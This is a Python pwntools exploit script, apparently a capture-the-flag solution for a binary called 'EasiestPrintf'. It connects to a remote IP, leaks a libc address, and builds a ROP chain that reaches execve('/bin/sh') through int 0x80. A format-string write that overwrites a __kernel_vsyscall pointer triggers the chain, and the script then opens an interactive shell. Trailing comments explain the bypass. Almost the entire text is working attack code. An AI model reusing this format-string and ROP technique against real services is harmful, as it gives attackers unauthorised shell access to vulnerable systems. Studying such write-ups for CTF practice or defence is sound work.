from pwn import *
import sys
import os

#io = process('./EasiestPrintf') 
io = remote('202.120.7.210', 12321)
context.log_level = 'debug'
pause()

io.recvuntil(':')
io.sendline(str(0x8049fc8))

io.recvuntil('0x')
printf_addr = int('0x' + io.recvuntil('\n')[:-1], 16)
log.info('printf_addr :' + hex(printf_addr))
libc_main = printf_addr - 314480
mmaped_addr = libc_main + (0xf7e29710 - 0xf7e2a000)
print hex(printf_addr - 314480)
#mmaped_addr = printf_addr - 0x4cc70 - (0xf752b000 - 0xf752a950)

io.recvuntil('\n')
write_1 = libc_main + 0x0006b63b ## add esp, 0x180 ; pop ebx ; pop esi ; pop edi ; ret
payload = ''
payload += p32(0x804899c) * 12
payload += p32(libc_main + 0xf92ce) ## xor edx, edx; mov eax, edx; ret
payload += p32(libc_main + 0x00001aa2) ## pop edx, ret
payload += p32(0x001a9048 + libc_main) ## data
payload += p32(0x000a82bc + libc_main) # mov dword ptr [edx], eax ; ret 
payload += p32(0x000198ae + libc_main) ## pop ebx; ret 
payload += p32(libc_main + 1439057) ## binsh
payload += p32(libc_main + 0x000a91be) ## pop ecx; ret
payload += p32(libc_main + 0x001a9048) ## data + 8
payload += p32(libc_main + 0x00144278) ## add eax 11
payload += p32(libc_main + 0x0002e3f5) ## int 80
payload += fmtstr_payload(7 + len(payload)/4, {mmaped_addr: write_1}, len(payload), write_size='byte')
print len(payload)
io.sendline(payload)
io.interactive()

#so the most difficult thing here is to bypass the exit.
#i referenced 2014 codegate 4stone
#to overwrite __kernel_vsyscall addr stored in libc
#hijack $rip when in vprintf
#because both system() and execve() called __kernel_vsyscall
#so we can only rop to call int 80
